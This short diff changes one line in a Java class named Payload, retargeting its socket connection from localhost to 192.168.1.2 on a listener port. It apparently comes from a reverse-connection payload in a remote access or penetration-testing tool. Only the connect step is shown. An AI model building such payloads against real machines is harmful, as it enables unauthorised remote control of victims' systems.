@@ -64,7 +64,7 @@ public class Payload {
 	private boolean connect() {
 		try {
 			pRes.socket = new Socket();
-			pRes.socket.connect(new InetSocketAddress("127.0.0.1", pRes.LISTEN_PORT), 10000);
+			pRes.socket.connect(new InetSocketAddress("192.168.1.2", pRes.LISTEN_PORT), 10000);
 			return true;
 
 		} catch (Exception e) {
